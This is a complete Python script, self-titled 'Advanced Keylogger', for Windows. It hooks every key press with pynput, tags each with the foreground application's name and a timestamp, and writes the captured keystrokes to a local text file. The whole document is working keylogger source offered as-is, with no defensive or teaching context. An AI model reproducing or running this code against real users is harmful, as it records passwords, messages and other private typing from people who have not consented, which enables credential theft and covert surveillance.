from pynput.keyboard import Key,Listener
from win32gui import GetForegroundWindow as getapp
from win32process import GetWindowThreadProcessId as getid
from psutil import Process
from datetime import datetime
with open("key_logs.txt","w+") as f:
    a="Advanced Keylogger"
    f.write(f"{a:#^60}\n")
lastappname=""
def key_log(key):
    global lastappname
    hwnd=getapp()
    _,pid=getid(hwnd)
    appname=Process(pid).name()
    time=datetime.now().strftime("%H:%M:%S")
    if lastappname==appname:
        logs=f"{key}"
    else:
        logs=f"\nAppname: {appname}\tTime:{time}\n{key}"
        lastappname=appname
    with open("key_logs.txt","a")as f:
        f.write(logs)
def main():
     with Listener(on_press=key_log) as listener:
          listener.join()

if __name__=="__main__":
   main()
